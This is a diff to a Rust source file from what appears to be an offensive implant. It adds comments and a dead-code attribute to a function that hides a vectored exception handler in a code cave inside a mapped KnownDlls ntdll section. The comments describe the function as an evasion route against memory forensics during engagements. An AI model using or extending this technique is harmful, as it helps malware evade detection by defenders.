@@ -146,6 +146,17 @@ pub fn proxy_enabled() -> bool {
 /// Register a VEH handler where the handler address appears file-backed
 /// (mapped from `\KnownDlls\ntdll.dll` via `SEC_IMAGE` section).
 ///
+/// # Status: dead code — pending wiring (Mode B, unselected)
+///
+/// Fully implemented (NtOpenFile → NtCreateSection → NtMapViewOfSection →
+/// code-cave copy → AddVectoredExceptionHandler) but ZERO callers in the
+/// implant. The active HWBP / VEH registration path uses
+/// `AddVectoredExceptionHandler` directly (Mode A) rather than the
+/// section-backed variant (Mode B). Kept as an alternate evasion route for
+/// engagements that need the handler address to resolve to
+/// `\KnownDlls\ntdll.dll` under memory forensics. Do NOT delete — see
+/// ROADMAP: "proxy_veh Mode B".
+///
 /// # How it works
 /// 1. Opens `\KnownDlls\ntdll.dll` via `NtOpenFile` + `NtCreateSection(SEC_IMAGE)`
 /// 2. Maps a view of the section at a random address via `NtMapViewOfSection`
@@ -162,6 +173,7 @@ pub fn proxy_enabled() -> bool {
 ///
 /// # Safety
 /// Must run after PEB-walk bootstrap. Single-threaded beacon context.
+#[allow(dead_code)]
 pub unsafe fn register_section_backed_handler(
     handler: unsafe extern "system" fn(usize) -> i32,
 ) -> *mut c_void {
